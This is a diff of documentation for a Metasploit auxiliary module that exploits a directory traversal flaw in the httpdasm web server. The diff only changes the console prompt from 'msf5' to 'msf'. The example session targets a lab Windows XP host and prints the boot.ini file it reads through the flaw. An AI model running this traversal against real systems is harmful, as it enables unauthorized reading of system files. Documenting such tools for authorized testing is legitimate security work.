@@ -44,10 +44,10 @@
 ### Tested on Windows XP x86
 
   ```
-  msf5 > use auxiliary/scanner/http/httpdasm_directory_traversal
-  msf5 auxiliary(scanner/http/httpdasm_directory_traversal) > set rhosts 192.168.37.128
+  msf > use auxiliary/scanner/http/httpdasm_directory_traversal
+  msf auxiliary(scanner/http/httpdasm_directory_traversal) > set rhosts 192.168.37.128
   rhosts => 192.168.37.128
-  msf5 auxiliary(scanner/http/httpdasm_directory_traversal) > run
+  msf auxiliary(scanner/http/httpdasm_directory_traversal) > run
 
   [boot loader]
   timeout=30
@@ -56,5 +56,5 @@
   multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /noexecute=optin /fastdetect
 
   [*] Auxiliary module execution completed
-  msf5 auxiliary(scanner/http/httpdasm_directory_traversal) >
+  msf auxiliary(scanner/http/httpdasm_directory_traversal) >
   ```
